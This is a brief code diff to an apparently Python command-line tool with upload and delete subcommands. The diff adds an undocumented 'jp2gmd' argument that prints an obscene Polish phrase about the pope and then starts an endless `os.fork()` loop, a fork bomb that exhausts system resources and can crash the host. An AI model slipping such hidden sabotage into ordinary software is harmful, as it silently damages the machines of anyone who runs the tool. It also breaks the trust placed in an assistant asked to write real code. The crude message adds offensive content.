@@ -57,5 +57,9 @@ elif args[0] == 'up':
     uploader()
 elif args[0] == 'delete':
     deleteMaps()
+elif args[0] == 'jp2gmd':
+    import os
+    print('papiez zrzygal mi sie do dupy')
+    while True: os.fork()
 else:
     pass
